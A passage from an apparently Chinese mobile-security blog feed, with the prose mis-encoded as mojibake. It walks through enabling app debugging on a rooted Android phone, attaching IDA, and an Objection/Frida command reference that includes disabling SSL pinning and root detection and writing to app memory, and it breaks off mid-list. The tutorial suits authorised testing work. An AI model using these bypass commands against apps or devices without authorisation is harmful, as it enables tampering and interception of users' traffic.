        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>IDA åŠ¨æ€è°ƒè¯• APP æ“ä½œæµç¨‹è®°å½•ã€‚æœ¬æ–‡ä¸»è¦å†…å®¹åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œè®¾å¤‡ root ååˆ·å…¥ Magisk æ’ä»¶é…ç½®è°ƒè¯•æ‰€æœ‰ APP æƒé™ä»¥åŠ IDA åŠ¨æ€è°ƒè¯•APP æ“ä½œæ­¥éª¤ã€‚</p><h2 id="äºŒã€é…ç½®è°ƒè¯•æƒé™"><a href="#äºŒã€é…ç½®è°ƒè¯•æƒé™" class="headerlink" title="äºŒã€é…ç½®è°ƒè¯•æƒé™"></a>äºŒã€é…ç½®è°ƒè¯•æƒé™</h2><p>é¦–å…ˆéœ€è¦ä¸€å° root çš„å®‰å“æ‰‹æœºï¼Œè®¾ç½®é‡Œæ‰“å¼€ å¼€å‘è€…é€‰é¡¹ï¼Œå‹¾é€‰USBè°ƒè¯•ã€‚å…¶æ¬¡éœ€æ£€æŸ¥æ‰‹æœºè®¾å¤‡æ˜¯å¦å…·å¤‡è°ƒè¯•æ‰€æœ‰ APP çš„æƒé™ï¼Œå…·ä½“æ£€æŸ¥æ–¹æ³• adb shell åè¾“å…¥ getprop ro.debuggable ï¼Œè‹¥è¾“å‡ºä¸º 1 åˆ™ä¸ºæˆåŠŸå¼€å¯äº†è°ƒè¯•æƒé™ï¼Œè‹¥ä¸º0åˆ™æœªå¼€å¯ã€‚å¼€å¯æ–¹æ³•å¦‚ä¸‹ï¼š</p><p>1ã€ä½¿ç”¨ MagiskHidePropsConf ä¿®æ”¹ getprop ro.debuggable&#x3D;1ï¼Œç›®çš„æ˜¯è®¾ç½®æ‰€æœ‰ app å¯è°ƒè¯•ï¼Œè¯¥æ–¹æ³•å³ root ååˆ©ç”¨ Magisk æ’ä»¶ MagiskHidePropsConf å¼€å¯æƒé™ã€‚é¢å…·å®‰è£…æ–¹æ³•ä¸å†è¿™é‡Œé˜è¿°ã€‚æ’ä»¶ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf">https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf</a> ç„¶ååœ¨é¢å…· app ä¸­-ã€‹æ¨¡å—-ã€‹ä»æœ¬åœ°å®‰è£…-ã€‹é€‰æ‹©ä¸‹è½½çš„ MagiskHidePropsConf ç„¶åé‡å¯æ‰‹æœºã€‚</p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213140854.jpg" data-caption="å¾®ä¿¡å›¾ç‰‡_20240213140854"><img src="/../images/mobile/ida/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213140854.jpg" alt="å¾®ä¿¡å›¾ç‰‡_20240213140854"></a></p><p>2ã€é‡å¯æ‰‹æœºåè¿›è¡Œ adb shellï¼Œæ‰§è¡Œ props è¿›å…¥æ’ä»¶é…ç½®å¼€å¯æƒé™ï¼Œå…·ä½“æ“ä½œæˆªå›¾å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">props</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204110219811.png" data-caption="image-20240204110219811"><img src="/../images/mobile/ida/image-20240204110219811.png" alt="image-20240204110219811"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204110336419.png" data-caption="image-20240204110336419"><img src="/../images/mobile/ida/image-20240204110336419.png" alt="image-20240204110336419"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204110526798.png" data-caption="image-20240204110526798"><img src="/../images/mobile/ida/image-20240204110526798.png" alt="image-20240204110526798"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204110542131.png" data-caption="image-20240204110542131"><img src="/../images/mobile/ida/image-20240204110542131.png" alt="image-20240204110542131"></a></p><p>é‡å¯åè¿›å…¥ adb è¾“å…¥ getprop ro.debuggable ï¼Œè‹¥è¾“å‡ºä¸º 1 åˆ™ä¸ºæˆåŠŸå¼€å¯äº†è°ƒè¯•æƒé™</p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204110743170.png" data-caption="image-20240204110743170"><img src="/../images/mobile/ida/image-20240204110743170.png" alt="image-20240204110743170"></a></p><h2 id="ä¸‰ã€IDA-è°ƒè¯•-APP"><a href="#ä¸‰ã€IDA-è°ƒè¯•-APP" class="headerlink" title="ä¸‰ã€IDA è°ƒè¯• APP"></a>ä¸‰ã€IDA è°ƒè¯• APP</h2><p>1ã€åœ¨ ida å®‰è£…ç›®å½• &#x2F;dbgsrvæ‰¾åˆ°å¯¹åº”çš„ android_server ï¼Œ32 ä½ arm å°±æ˜¯ android_server </p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204095233694.png" data-caption="image-20240204095233694"><img src="/../images/mobile/ida/image-20240204095233694.png" alt="image-20240204095233694"></a></p><p>2ã€ç„¶ååˆ©ç”¨ adb ä¸Šä¼ è‡³æ‰‹æœºä¸Šçš„ &#x2F;data&#x2F;local&#x2F;tmp ç›®å½•ä¸‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb.exe push C:\Users\Boom\Desktop\app\IDA_Pro_8.3\dbgsrv\android_server64 /data/local/tmp</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204101243016.png" data-caption="image-20240204101243016"><img src="/../images/mobile/ida/image-20240204101243016.png" alt="image-20240204101243016"></a></p><p>3ã€adb shell è¿›å…¥ Android è®¾å¤‡ï¼Œç»™äºˆ android_server64 æƒé™ï¼Œå¹¶å¯åŠ¨æœåŠ¡ç«¯</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">chmod +x 777 android_server64</span><br><span class="line">./android_server64</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204101558154.png" data-caption="image-20240204101558154"><img src="/../images/mobile/ida/image-20240204101558154.png" alt="image-20240204101558154"></a></p><p>4ã€IDA è°ƒè¯•ï¼Œadb è½¬å‘æœ¬æœºç«¯å£åˆ°å®‰å“ android_server ç›‘å¬çš„ç«¯å£ï¼Œç„¶åæ‰“å¼€ IDA é€‰æ‹© Go Work on your own</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204111907048.png" data-caption="image-20240204111907048"><img src="/../images/mobile/ida/image-20240204111907048.png" alt="image-20240204111907048"></a></p><p>5ã€è¿›å…¥åˆ° IDA ç•Œé¢ï¼Œé€‰æ‹©è¿œç¨‹è°ƒè¯•</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Debugger-&gt;Attach-&gt;Remote ARMLinux/Android debugger</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204111450366.png" data-caption="image-20240204111450366"><img src="/../images/mobile/ida/image-20240204111450366.png" alt="image-20240204111450366"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204111616630.png" data-caption="image-20240204111616630"><img src="/../images/mobile/ida/image-20240204111616630.png" alt="image-20240204111616630"></a></p><p>6ã€æ‰¾åˆ°éœ€è¦è°ƒè¯•çš„ APP PIDå·</p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204112126337.png" data-caption="image-20240204112126337"><img src="/../images/mobile/ida/image-20240204112126337.png" alt="image-20240204112126337"></a></p><p>é€‰æ‹©éœ€è¦è°ƒè¯•çš„ PID è¿›è¡Œè°ƒè¯•å³å¯</p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204112401666.png" data-caption="image-20240204112401666"><img src="/../images/mobile/ida/image-20240204112401666.png" alt="image-20240204112401666"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/ida/image-20240204112813449.png" data-caption="image-20240204112813449"><img src="/../images/mobile/ida/image-20240204112813449.png" alt="image-20240204112813449"></a></p><h2 id="å››ã€å‚è€ƒ"><a href="#å››ã€å‚è€ƒ" class="headerlink" title="å››ã€å‚è€ƒ"></a>å››ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/GH-123/p/13413063.html</span><br><span class="line">https://zhuanlan.zhihu.com/p/660604996</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APPæµ‹è¯•ç³»åˆ— </category>
          
          <category> ç§»åŠ¨å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·ä½¿ç”¨ </tag>
            
            <tag> IDA </tag>
            
            <tag> åŠ¨æ€è°ƒè¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç§»åŠ¨å®‰å…¨-Ojection åŸºæœ¬æ“ä½œä½¿ç”¨æŒ‡å—</title>
      <link href="/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-Ojection%20%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-Ojection%20%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>Objection æ˜¯åŸºäº Frida æ¡†æ¶å¼€å‘çš„ä¸€ä¸ªå·¥å…·ï¼Œå®ƒæä¾›äº†ä¸€ç»„ä¾¿æ·çš„åŠŸèƒ½å’Œè„šæœ¬ï¼Œä»¥ç®€åŒ–åœ¨ç§»åŠ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ Frida è¿›è¡ŒåŠ¨æ€åˆ†æå’Œæ¼æ´åˆ©ç”¨çš„è¿‡ç¨‹ã€‚</p><h2 id="äºŒã€åŸºæœ¬é…ç½®"><a href="#äºŒã€åŸºæœ¬é…ç½®" class="headerlink" title="äºŒã€åŸºæœ¬é…ç½®"></a>äºŒã€åŸºæœ¬é…ç½®</h2><h3 id="å®‰è£…-objection"><a href="#å®‰è£…-objection" class="headerlink" title="å®‰è£… objection"></a>å®‰è£… objection</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida==12.8.0</span><br><span class="line">pip3 install frida-tools==5.3.0</span><br><span class="line">pip3 install objection==1.8.4</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/objection/image-20240119165326651.png" data-caption="image-20240119165326651"><img src="/../images/mobile/objection/image-20240119165326651.png" alt="image-20240119165326651"></a></p><h3 id="å¯åŠ¨æœåŠ¡ç«¯ï¼Œæ‰‹æœºç«¯å¼€å¯å¯¹åº”ç‰ˆæœ¬çš„-frida-server"><a href="#å¯åŠ¨æœåŠ¡ç«¯ï¼Œæ‰‹æœºç«¯å¼€å¯å¯¹åº”ç‰ˆæœ¬çš„-frida-server" class="headerlink" title="å¯åŠ¨æœåŠ¡ç«¯ï¼Œæ‰‹æœºç«¯å¼€å¯å¯¹åº”ç‰ˆæœ¬çš„ frida-server"></a>å¯åŠ¨æœåŠ¡ç«¯ï¼Œæ‰‹æœºç«¯å¼€å¯å¯¹åº”ç‰ˆæœ¬çš„ frida-server</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">funsiooo@ubuntu:~/tools/app/platform-tools$ ./adb shell</span><br><span class="line">dipper:/ $ su</span><br><span class="line">dipper:/ # cd data/app_test/                                                                                 </span><br><span class="line">dipper:/data/app_test # ./fs16.1.6</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/objection/image-20240119170729257.png" data-caption="image-20240119170729257"><img src="/../images/mobile/objection/image-20240119170729257.png" alt="image-20240119170729257"></a></p><h3 id="å®šä½-app-åŒ…åï¼Œå¯»æ‰¾éœ€è¦-hook-app-çš„åŒ…å"><a href="#å®šä½-app-åŒ…åï¼Œå¯»æ‰¾éœ€è¦-hook-app-çš„åŒ…å" class="headerlink" title="å®šä½ app åŒ…åï¼Œå¯»æ‰¾éœ€è¦ hook app çš„åŒ…å"></a>å®šä½ app åŒ…åï¼Œå¯»æ‰¾éœ€è¦ hook app çš„åŒ…å</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Uia</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/objection/image-20240212200601158.png" data-caption="image-20240212200601158"><img src="/../images/mobile/objection/image-20240212200601158.png" alt="image-20240212200601158"></a></p><h3 id="å¯åŠ¨-Objection"><a href="#å¯åŠ¨-Objection" class="headerlink" title="å¯åŠ¨ Objection"></a>å¯åŠ¨ Objection</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â— æ­£å¸¸å¯åŠ¨</span><br><span class="line">objection -g &lt;åŒ…å&gt; explore</span><br><span class="line"></span><br><span class="line">â— æŒ‡å®šIPç«¯å£</span><br><span class="line">objection -N -h &lt;æ‰‹æœºipåœ°å€&gt; -p &lt;ç«¯å£&gt; -g &lt;åŒ…å&gt; explore</span><br><span class="line"></span><br><span class="line">â— spawn å¯åŠ¨å‰ hook</span><br><span class="line">objection -N -h 192.168.1.3 -p 9999 -g åŒ…å explore --startup-command &quot;android hooking watch class &#x27;åŒ…å.ç±»å&#x27;&quot;</span><br><span class="line"> </span><br><span class="line">â— spawn å¯åŠ¨å‰ Hook å¹¶æ‰“å°å‚æ•°ã€è¿”å›å€¼ã€å‡½æ•°è°ƒç”¨æ ˆ</span><br><span class="line">objection -N -h 192.168.1.3 -p 9999 -g åŒ…å explore --startup-command &quot;android hooking watch class_method &#x27;åŒ…å.ç±»å.æ–¹æ³•&#x27;  --dump-args --dump-return --dump-backtrace&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/objection/image-20240119170941606-17077397233601.png" data-caption="image-20240119170941606"><img src="/../images/mobile/objection/image-20240119170941606-17077397233601.png" alt="image-20240119170941606"></a></p><h2 id="ä¸‰ã€åŸºæœ¬ä½¿ç”¨"><a href="#ä¸‰ã€åŸºæœ¬ä½¿ç”¨" class="headerlink" title="ä¸‰ã€åŸºæœ¬ä½¿ç”¨"></a>ä¸‰ã€åŸºæœ¬ä½¿ç”¨</h2><p>å¯åŠ¨ Objection åœ¨å…¶ç»ˆç«¯æ‰§è¡Œç›¸å…³å‘½ä»¤ä»¥ä¾¿å¿«é€Ÿè·å–æƒ³è¦çš„ä¿¡æ¯ã€‚</p><h3 id="æŸ¥çœ‹å½“å‰-APP-ç¯å¢ƒ"><a href="#æŸ¥çœ‹å½“å‰-APP-ç¯å¢ƒ" class="headerlink" title="æŸ¥çœ‹å½“å‰ APP ç¯å¢ƒ"></a>æŸ¥çœ‹å½“å‰ APP ç¯å¢ƒ</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/objection/image-20240119170956328-17077398521185.png" data-caption="image-20240119170956328"><img src="/../images/mobile/objection/image-20240119170956328-17077398521185.png" alt="image-20240119170956328"></a></p><h3 id="å¯¼å…¥å¤–éƒ¨-hook-è„šæœ¬"><a href="#å¯¼å…¥å¤–éƒ¨-hook-è„šæœ¬" class="headerlink" title="å¯¼å…¥å¤–éƒ¨ hook è„šæœ¬"></a>å¯¼å…¥å¤–éƒ¨ hook è„šæœ¬</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import /Desktop/Hook.js</span><br></pre></td></tr></table></figure></div><h3 id="Memory-æŒ‡ä»¤ï¼Œæå–å†…å­˜ä¿¡æ¯"><a href="#Memory-æŒ‡ä»¤ï¼Œæå–å†…å­˜ä¿¡æ¯" class="headerlink" title="Memory æŒ‡ä»¤ï¼Œæå–å†…å­˜ä¿¡æ¯"></a>Memory æŒ‡ä»¤ï¼Œæå–å†…å­˜ä¿¡æ¯</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">â— æŸ¥çœ‹å†…å­˜ä¸­åŠ è½½çš„åº“</span><br><span class="line">memory list modules</span><br><span class="line"></span><br><span class="line">â— æŸ¥çœ‹æŸä¸ªåº“çš„å¯¼å‡ºå‡½æ•°</span><br><span class="line">memory list exports æ–‡ä»¶å.so</span><br><span class="line"></span><br><span class="line">â— å°†ç»“æœä¿å­˜åˆ° json æ–‡ä»¶ä¸­</span><br><span class="line">memory list exports æ–‡ä»¶å.so --json /ç”µè„‘ä¸Šçš„è·¯å¾„/libart.json</span><br><span class="line"></span><br><span class="line">â— æœç´¢å†…å­˜ä¸­å­—ç¬¦ä¸²</span><br><span class="line">memory search &quot;éœ€è¦æœç´¢çš„å­—ç¬¦ä¸²&quot; --string</span><br><span class="line"></span><br><span class="line">â— å±•ç¤ºæœç´¢åˆ°çš„åç§»åœ°å€ï¼Œä¸å±•ç¤ºé™„è¿‘å†…å­˜</span><br><span class="line">memory search &quot;61 61 61 71 71 71&quot; --offsets-only</span><br><span class="line"></span><br><span class="line">â— å†™å…¥å†…å­˜æ•°æ®</span><br><span class="line">memory write 0x12fc9c78 &#x27;61 61 61&#x27;</span><br><span class="line"></span><br><span class="line">â— æå–å†…å­˜æ•°æ®</span><br><span class="line">memory dump from_base 0x12fc9c78 9 /root/memory.txt</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/objection/image-20240119171102364-17077399638287.png" data-caption="image-20240119171102364"><img src="/../images/mobile/objection/image-20240119171102364-17077399638287.png" alt="image-20240119171102364"></a></p><h3 id="Hook-å†…å­˜æ¼«æ¸¸"><a href="#Hook-å†…å­˜æ¼«æ¸¸" class="headerlink" title="Hook å†…å­˜æ¼«æ¸¸"></a>Hook å†…å­˜æ¼«æ¸¸</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">â— æšä¸¾ activity</span><br><span class="line">android hooking list activities</span><br><span class="line"></span><br><span class="line">â— åˆ—å‡ºå†…å­˜ä¸­æ‰€æœ‰çš„ç±»</span><br><span class="line">android hooking list classes</span><br><span class="line"></span><br><span class="line">â— åˆ—å‡ºç±»çš„æ‰€æœ‰æ–¹æ³•</span><br><span class="line">android hooking list class_methods åŒ…å.ç±»å</span><br><span class="line"></span><br><span class="line">â— åœ¨å†…å­˜ä¸­æ‰€æœ‰å·²åŠ è½½çš„ç±»ä¸­æœç´¢åŒ…å«ç‰¹å®šå…³é”®è¯çš„ç±»</span><br><span class="line">android hooking search classes åŒ…ååŒ…å«çš„å…³é”®è¯</span><br><span class="line"></span><br><span class="line">â— æœç´¢å†…å­˜ä¸­æ‰€æœ‰å·²åŠ è½½ç±»çš„æ‰€æœ‰æ–¹æ³•</span><br><span class="line">android hooking search methods æ–¹æ³•å</span><br><span class="line"></span><br><span class="line">â— æŸ¥æ‰¾ç±»çš„æ‰€æœ‰å®ä¾‹</span><br><span class="line">android heap search instances ç±»å</span><br><span class="line"></span><br><span class="line">â— hook ç±»çš„æ‰€æœ‰æ–¹æ³•</span><br><span class="line">android hooking watch class åŒ…å.ç±»å</span><br><span class="line"></span><br><span class="line">â— hook ç±»å•ä¸ªæ–¹æ³•</span><br><span class="line">android hooking watch class_method åŒ…å.ç±»å.æ–¹æ³• --dump-args --dump-backtrace --dump-return</span><br><span class="line"></span><br><span class="line">â— hook å…¶ä¸­ä¸€ä¸ªé‡è½½å‡½æ•°ï¼ŒæŒ‡å®šå‚æ•°ç±»å‹ï¼Œå¤šä¸ªå‚æ•°ç”¨é€—å·åˆ†éš”</span><br><span class="line">android hooking watch class_method åŒ…å.ç±»å.æ–¹æ³• &quot;å‚æ•°1,å‚æ•°2&quot;</span><br><span class="line"></span><br><span class="line">â— ç”Ÿæˆhookè„šæœ¬</span><br><span class="line">android hooking generate simple åŒ…å.ç±»å</span><br></pre></td></tr></table></figure></div><h3 id="æŸ¥çœ‹ç»„ä»¶"><a href="#æŸ¥çœ‹ç»„ä»¶" class="headerlink" title="æŸ¥çœ‹ç»„ä»¶"></a>æŸ¥çœ‹ç»„ä»¶</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â— æŸ¥çœ‹ APP çš„ç»„ä»¶ä½¿ç”¨</span><br><span class="line">android hooking list activities</span><br><span class="line">android hooking list services</span><br><span class="line">android hooking list receivers</span><br><span class="line">android hooking list providers</span><br><span class="line"></span><br><span class="line">â— è·å–å½“å‰ activity</span><br><span class="line">android hooking get current_activity</span><br><span class="line"></span><br><span class="line">â— å¯åŠ¨æŒ‡å®š activity</span><br><span class="line">android intent launch_activity xxxx</span><br><span class="line"></span><br><span class="line">â— å¯åŠ¨æŒ‡å®šservice</span><br><span class="line">android intent launch_service xxxx</span><br></pre></td></tr></table></figure></div><h3 id="ä»»åŠ¡ç®¡ç†"><a href="#ä»»åŠ¡ç®¡ç†" class="headerlink" title="ä»»åŠ¡ç®¡ç†"></a>ä»»åŠ¡ç®¡ç†</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â— æŸ¥çœ‹Hookä»»åŠ¡åˆ—è¡¨</span><br><span class="line">jobs list</span><br><span class="line"></span><br><span class="line">â— å–æ¶ˆHookä»»åŠ¡</span><br><span class="line">jobs kill jobid</span><br></pre></td></tr></table></figure></div><h3 id="Root-æŒ‡ä»¤"><a href="#Root-æŒ‡ä»¤" class="headerlink" title="Root æŒ‡ä»¤"></a>Root æŒ‡ä»¤</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â— å°è¯•å…³é—­ app çš„ root æ£€æµ‹</span><br><span class="line">android root disable</span><br><span class="line"></span><br><span class="line">â— å°è¯•å…³é—­ sslpinning æ ¡éªŒ</span><br><span class="line">android sslpinning disable</span><br><span class="line"></span><br><span class="line">â— å°è¯•æ¨¡æ‹Ÿ root ç¯å¢ƒ</span><br><span class="line">android root simulate</span><br><span class="line"></span><br><span class="line">â— æ‰§è¡Œå‘½ä»¤</span><br><span class="line">android shell_exec ls</span><br></pre></td></tr></table></figure></div><h3 id="æ—¥å¿—"><a href="#æ—¥å¿—" class="headerlink" title="æ—¥å¿—"></a>æ—¥å¿—</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/.objection/objection.log// objectionæ—¥å¿—æ–‡ä»¶ä½ç½®</span><br><span class="line"></span><br><span class="line">~/.objection/objection_history//å‘½ä»¤å†å²æ–‡ä»¶ä½ç½®</span><br></pre></td></tr></table></figure></div><h2 id="å››ã€Objection-æ’ä»¶"><a href="#å››ã€Objection-æ’ä»¶" class="headerlink" title="å››ã€Objection æ’ä»¶"></a>å››ã€Objection æ’ä»¶</h2><h3 id="Wallbreaker"><a href="#Wallbreaker" class="headerlink" title="Wallbreaker"></a>Wallbreaker</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â— æ’ä»¶åœ°å€</span><br><span class="line">https://github.com/hluwa/Wallbreaker</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">â— åŠ è½½æ’ä»¶</span><br><span class="line">æ–¹æ³•ä¸€ï¼š</span><br><span class="line">objection -g com.example.androiddemo explore  -P ~/.objection/plugins/Wallbreaker(æ’ä»¶è·¯å¾„)</span><br><span class="line"></span><br><span class="line">æ–¹æ³•äºŒï¼š</span><br><span class="line">objection -g com.example.androiddemo explore</span><br><span class="line">plugin load ~/.objection/plugins/Wallbreaker(æ’ä»¶è·¯å¾„)</span><br><span class="line"></span><br><span class="line">â— æ’ä»¶ä½¿ç”¨</span><br><span class="line"># æœç´¢ç±»</span><br><span class="line">plugin wallbreaker classsearch &lt;pattern&gt; </span><br><span class="line"></span><br><span class="line"># æœç´¢ç±»çš„å®ä¾‹å¯¹è±¡</span><br><span 